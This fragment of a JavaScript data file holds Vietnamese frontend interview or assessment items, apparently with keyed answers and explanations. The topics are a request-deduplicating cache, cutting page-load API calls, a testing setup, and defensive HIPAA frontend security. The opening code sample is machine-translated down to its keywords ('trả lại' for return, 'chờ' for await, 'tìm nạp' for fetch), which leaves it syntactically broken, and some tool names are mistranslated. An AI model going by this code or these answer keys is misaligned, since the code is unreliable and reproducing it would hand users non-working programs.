dữ liệu;\n})\n.cuối cùng(() => {\nthis.inflight.delete(key);\n});\n\nthis.inflight.set(key, Promise);\ntrả lại lời hứa;\n}\n\nđột biến (khóa: chuỗi) {\nthis.cache.delete(key);\n// Hủy yêu cầu trên chuyến bay đối với khóa này nếu nó tồn tại\nthis.inflight.delete(key);\n}\n\nrõ ràng() {\nthis.cache.clear();\nthis.inflight.clear();\n}\n\n// Tiện ích: lấy kích thước bộ đệm để theo dõi\nlấy kích thước() {\ntrả lại this.cache.size;\n}\n}\n\n// Ví dụ sử dụng:\nconst cache = newRequestCache(30000);// TTL mặc định 30 giây\n\n// Nhiều thành phần gọi đồng thời → chỉ 1 lần tìm nạp\nconst user = chờ cache.fetch(\'user:123\', () =>\ntìm nạp(\'/api/users/123\').then((r) => r.json())\n);\n\n// Sau khi đột biến, vô hiệu hóa bộ đệm\nđang chờ cập nhậtUser(123, newData);\ncache.mutate(\'user:123\');',
    explanation: 'Đây là phiên bản đơn giản hóa những gì SWR và React Query thực hiện trong nội bộ.Ba cơ chế cốt lõi: (1) Bộ đệm - Bản đồ lưu trữ dữ liệu phản hồi với dấu thời gian và TTL.Trước khi tìm nạp, hãy kiểm tra xem có tồn tại mục nhập bộ đệm hợp lệ hay không.Điều này giúp loại bỏ các lệnh gọi API dư thừa khi điều hướng trang và hiển thị lại.(2) Yêu cầu loại bỏ sự trùng lặp — một Bản đồ riêng biệt theo dõi những lời hứa trong chuyến bay.Nếu hai người gọi đồng thời yêu cầu cùng một khóa thì người gọi thứ hai sẽ nhận được Promise giống như người gọi đầu tiên.Điều này ngăn ngừa sự cố tìm nạp N+1 khi N thành phần gắn kết với cùng một phụ thuộc dữ liệu.(3) Đột biến/vô hiệu hóa — `mutate(key)` xóa mục nhập được lưu trong bộ nhớ đệm để lệnh gọi `fetch()` tiếp theo sẽ thực sự truy cập mạng.Gọi lệnh này sau các thao tác ghi (POST, PUT, DELETE) để đảm bảo dữ liệu mới.Bản đồ trên chuyến bay sử dụng Lời hứa trực tiếp (không phải bản sao), vì vậy việc loại bỏ trùng lặp không tốn phí.Việc dọn dẹp `cuối cùng` đảm bảo mục nhập trong chuyến bay bị xóa ngay cả khi không thành công, ngăn chặn các tham chiếu lời hứa cũ.Cải tiến sản xuất: stale-while-revalidate (trả lại bộ nhớ đệm cũ ngay lập tức, tải lại ở chế độ nền), trục xuất LRU, bộ nhớ đệm liên tục qua IndexedDB và thông báo cho người đăng ký khi cập nhật các mục trong bộ nhớ đệm.',
  },
  'atp-040': {
    question: 'Ứng dụng giao diện người dùng của bạn thực hiện hơn 50 lệnh gọi API trong lần tải trang đầu tiên, khiến các yêu cầu LCP và thác nước chậm.Thiết kế chiến lược để giảm yêu cầu này xuống dưới 10 yêu cầu mà không thay đổi hợp đồng API phụ trợ.',
    answer: 'Sử dụng lớp tổng hợp BFF (Backend For Frontend), triển khai nhóm yêu cầu, tận dụng tính năng ghép kênh HTTP/2 và di chuyển tìm nạp dữ liệu đến máy chủ (SSR/RSC).Tích cực lưu vào bộ nhớ đệm bằng tính năng cũ trong khi xác nhận lại.',
    explanation: 'Chiến lược tối ưu hóa theo lớp: (1) Tổng hợp BFF - giới thiệu một máy chủ nhẹ (tuyến API Next.js, proxy Express) nhận một yêu cầu từ khách hàng, xử lý song song 50 điểm cuối phụ trợ, tổng hợp kết quả và trả về một phản hồi duy nhất.Các API phụ trợ vẫn không thay đổi.Điều này biến 50 chuyến đi khứ hồi máy khách→máy chủ tuần tự thành 1 máy khách→BFF + 50 cuộc gọi BFF song song→phụ trợ (nằm trên cùng một mạng, do đó độ trễ là ~1ms mỗi lần).(2) Phân nhóm yêu cầu — đối với các API hỗ trợ nó, hãy phân nhóm nhiều yêu cầu tài nguyên thành một: thay vì `GET /users/1`, `GET /users/2`, ..., hãy sử dụng `GET /users?ids=1,2,3,...`.Nếu API không hỗ trợ điều này thì lớp BFF có thể triển khai nó.(3) Kết xuất phía máy chủ - sử dụng Next.js `getServerSideProps` hoặc React Server Components để tìm nạp dữ liệu trên máy chủ và gửi HTML được kết xuất trước.Máy khách nhận được trang có dữ liệu đã được điền sẵn — không có lệnh gọi API nào cho lần hiển thị ban đầu.(4) Ghép kênh HTTP/2 - nếu BFF không khả thi, ít nhất hãy phân phát từ phần phụ trợ HTTP/2.H2 ghép tất cả 50 yêu cầu qua một kết nối TCP, loại bỏ giới hạn 6 kết nối và chặn đầu dòng của HTTP/1.1.(5) Bộ nhớ đệm cũ trong khi xác nhận lại — đối với dữ liệu không thay đổi thường xuyên (hồ sơ người dùng, cờ tính năng, cấu hình), phân phối ngay lập tức từ bộ nhớ đệm và xác thực lại trong nền.Điều này làm giảm các yêu cầu hiệu quả chỉ đối với những yêu cầu có bộ đệm đã hết hạn.(6) Ưu tiên - tải dữ liệu trong màn hình đầu tiên trước, tải dữ liệu dưới màn hình đầu tiên khi cuộn hoặc tương tác.',
  },
  'atp-041': {
    question: 'Bạn là trưởng nhóm giao diện người dùng đang thiết lập cơ sở hạ tầng thử nghiệm cho một dự án mới.Xác định loại thử nghiệm, công cụ, quy trình CI, ngưỡng bao phủ và hướng dẫn cho nhóm.',
    answer: 'Thành tích thử nghiệm: nhiều bài kiểm tra tích hợp (Vitest + RTL + MSW), một số bài kiểm tra đơn vị về logic, một số bài kiểm tra E2E (Playwright) cho các đường dẫn quan trọng.CI chạy tất cả trên mọi PR.Cổng phủ sóng: 80% cho mã mới, 60% tổng thể.Không có bài kiểm tra ảnh chụp nhanh.',
    explanation: 'Kế hoạch cơ sở hạ tầng thử nghiệm hoàn chỉnh: (1) Công cụ - Vitest (nhanh, gốc ESM, tương thích với Vite) + Thư viện thử nghiệm React + MSW cho đơn vị/tích hợp.Nhà viết kịch cho E2E.Chromatic cho hồi quy thị giác (nếu sử dụng Storybook).(2) Các loại thử nghiệm - Thử nghiệm đơn vị cho các hàm thuần túy, tiện ích, móc tùy chỉnh và bộ giảm tốc.Kiểm tra tích hợp cho các trang và tính năng (hiển thị trang, mô phỏng API, tương tác với tư cách người dùng).E2E kiểm tra 5-10 luồng quan trọng (đăng ký, thanh toán, tính năng cốt lõi) trên môi trường chạy thử.(3) Đường dẫn CI - Kiểm tra PR: lint → kiểm tra loại → kiểm tra đơn vị/tích hợp (song song) → kiểm tra E2E (song song trên các trình duyệt).Hợp nhất vào chính: bộ thử nghiệm đầy đủ + hồi quy trực quan + triển khai để dàn dựng.(4) Phạm vi bảo hiểm - thực thi phạm vi bảo hiểm 80% cho các tệp mới thông qua cờ `--changedSince`.Mục tiêu chung là 60%, tăng dần theo thời gian.KHÔNG thực thi 100% - nó dẫn đến các bài kiểm tra vô nghĩa.(5) Hướng dẫn - Kiểm tra hành vi, không thực hiện.Sử dụng `getByRole` thay vì `getByTestId`.Không có bài kiểm tra chụp nhanh (tín hiệu thấp, độ nhiễu cao).Mọi sửa lỗi đều phải bao gồm kiểm tra hồi quy.Các bài kiểm tra phải độc lập và chạy theo bất kỳ thứ tự nào.(6) Trải nghiệm của nhà phát triển — `vitest --watch` cho quy trình làm việc TDD.Móc cam kết trước chạy các bài kiểm tra bị ảnh hưởng.Báo cáo kiểm tra CI có ảnh chụp màn hình và dấu vết lỗi (Playwright).(7) Chiến lược mô phỏng — Trình xử lý MSW trong thư mục `mocks/` được chia sẻ.Mỗi trình xử lý trả về dữ liệu thực tế bằng thư viện gốc (như Fishery).',
  },
  'atp-042': {
    question: 'React SPA của bạn xử lý dữ liệu sức khỏe nhạy cảm (bối cảnh HIPAA).Thiết kế kiến ​​trúc bảo mật giao diện người dùng bao gồm xác thực, bảo vệ dữ liệu, ghi nhật ký kiểm tra và quản lý phiên.',
    answer: 'Giao diện người dùng không tin cậy: vòng quay mã thông báo làm mới + JWT tồn tại trong thời gian ngắn, bộ nhớ được mã hóa ở trạng thái nghỉ, CSP + SRI, hết thời gian phiên có cảnh báo, quy trình kiểm tra toàn diện và che giấu dữ liệu cho các trường nhạy cảm.',
    explanation: 'Kiến trúc giao diện người dùng tuân thủ HIPAA: (1) Xác thực — Luồng OAuth 2.0 + PKCE (không có bí mật ứng dụng khách).Mã thông báo truy cập có thời hạn sử dụng 5 phút được lưu trong bộ nhớ (không phải localStorage).Làm mới mã thông báo trong HttpOnly, Secure, SameSite=Các cookie nghiêm ngặt có vòng quay trong mỗi lần sử dụng (mã thông báo làm mới cũ sẽ bị vô hiệu ngay lập tức).(2) Quản lý phiên — hết thời gian chờ 15 phút không hoạt động.Chế độ cảnh báo 2 phút trước khi hết thời gian chờ.Phiên mở rộng dựa trên hoạt động của người dùng (chuột, bàn phím).Khi hết thời gian chờ: xóa tất cả dữ liệu nhạy cảm khỏi bộ nhớ, thu hồi mã thông báo làm mới, chuyển hướng sang đăng nhập.(3) Bảo vệ dữ liệu - không bao giờ lưu trữ PHI (Thông tin sức khỏe được bảo vệ) trong bộ nhớ trình duyệt (localStorage, IndexedDB, sessionStorage).Sử dụng tiêu đề CSP để ngăn chặn việc lọc dữ liệu.Bật SRI (Tính toàn vẹn nguồn phụ) cho tất cả tập lệnh CDN.Tắt tính năng tự động hoàn thành của trình duyệt trên các trường PHI.(4) Ghi nhật ký kiểm tra - ghi nhật ký mọi sự kiện truy cập dữ liệu: ai đã truy cập hồ sơ bệnh nhân nào, khi nào, từ IP nào.Gửi các sự kiện kiểm tra tới nhật ký phụ trợ chống giả mạo.Ghi lại các lần truy cập không thành công.(5) Che dấu dữ liệu — SSN và các trường nhạy cảm khác hiển thị bị che theo mặc định (***-**-1234), yêu cầu nhấp chuột "tiết lộ" rõ ràng cũng được ghi lại kiểm tra.(6) Vận chuyển - Chỉ TLS 1.3, tiêu đề HSTS, ghim chứng chỉ cho thiết bị di động.(7) Bổ sung - vô hiệu hóa tính năng sao chép bảng tạm cho các trường PHI, hình mờ hiển thị dữ liệu với danh tính người dùng, triển khai quyền truy cập kính vỡ trong các trường hợp khẩn cấp với tính năng ghi nhật ký nâng cao.',
  },
}
